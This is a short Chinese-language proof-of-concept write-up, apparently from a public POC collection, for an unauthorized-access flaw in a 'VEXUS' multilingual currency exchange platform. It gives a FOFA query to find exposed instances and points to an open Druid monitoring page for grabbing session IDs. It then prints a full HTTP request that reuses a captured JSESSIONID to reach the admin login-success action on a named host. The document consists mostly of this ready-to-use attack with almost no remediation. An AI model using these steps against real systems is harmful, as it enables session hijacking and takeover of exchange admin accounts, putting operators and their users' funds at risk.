# VEXUS多语言货币交易所存在未授权访问漏洞

# 一、漏洞简介
VEXUS多语言货币交易所存在未授权访问漏洞

# 二、影响版本
+ VEXUS多语言货币交易所

# 三、资产测绘
+ fofa`"image/n2.png" && "public/login.action"`
+ 特征


# 四、漏洞复现
```java
/druid/index.html
```


获取session后可通过下面poc进行爆破

```java
GET /normal/LoginSuccessAction!view.action?username=admin HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: no-cache
Connection: keep-alive
Cookie: JSESSIONID=可用的SESSION
Host: admin.kftust.com
Pragma: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nkwou5fss984m2t8>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
